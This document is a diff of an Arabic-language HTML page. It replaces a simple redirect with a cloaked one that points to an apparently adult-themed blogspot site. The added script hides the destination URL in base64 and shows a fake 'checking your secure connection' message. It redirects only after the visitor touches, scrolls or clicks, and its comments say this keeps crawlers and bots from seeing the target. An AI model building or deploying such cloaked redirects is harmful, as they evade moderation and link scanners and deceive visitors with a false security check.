@@ -1,17 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="robots" content="noindex, nofollow">
-    <title>Loading...</title>
-    
-    <meta http-equiv="refresh" content="0;url=https://beautyonlyfans.blogspot.com/?m=1">
-    
-    <script>
-        /* تحويل احتياطي سريع جداً عبر السكربت في حال تعطّل الميتا */
-        window.location.replace("https://beautyonlyfans.blogspot.com/?m=1");
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔒 المحتوى قيد التحميل...</title>
+    <style>
+        body { 
+            background: #0b0f19; 
+            color: #fff; 
+            font-family: sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .loader-text { 
+            font-size: 18px; 
+            letter-spacing: 1px; 
+            animation: pulse 1.5s infinite; 
+            text-align: center; 
+            line-height: 1.6;
+        }
+        @keyframes pulse { 
+            0% { opacity: 0.5; } 
+            50% { opacity: 1; } 
+            100% { opacity: 0.5; } 
+        }
+    </style>
 </head>
 <body>
+
+    <div class="loader-text">
+        جاري فحص اتصالك الآمن...<br>
+        <span style="font-size: 14px; color: #ff0055; font-weight: bold;">إلمس الشاشة أو مرر لأسفل للتحديث</span>
+    </div>
+
+    <script>
+        // الكود المشفر الخاص بمدونتك (تم إدخاله بنجاح)
+        var encryptedDestination = "aHR0cHM6Ly9iZWF1dHlvbmx5ZmFucy5ibG9nc3BvdC5jb20="; 
+
+        function decryptAndRedirect() {
+            try {
+                // فك التشفير والتوجيه للبشر فقط
+                var realUrl = atob(encryptedDestination);
+                window.location.replace(realUrl);
+            } catch(e) {
+                // تجنب إظهار الأخطاء للروبوتات
+            }
+        }
+
+        // قفل الأمان السلوكي (يتفعل بمجرد لمس أو تحريك الشاشة)
+        window.addEventListener('touchmove', function() {
+            decryptAndRedirect();
+        }, { once: true });
+
+        window.addEventListener('scroll', function() {
+            decryptAndRedirect();
+        }, { once: true });
+
+        window.addEventListener('click', function() {
+            decryptAndRedirect();
+        }, { once: true });
+    </script>
+
 </body>
 </html>
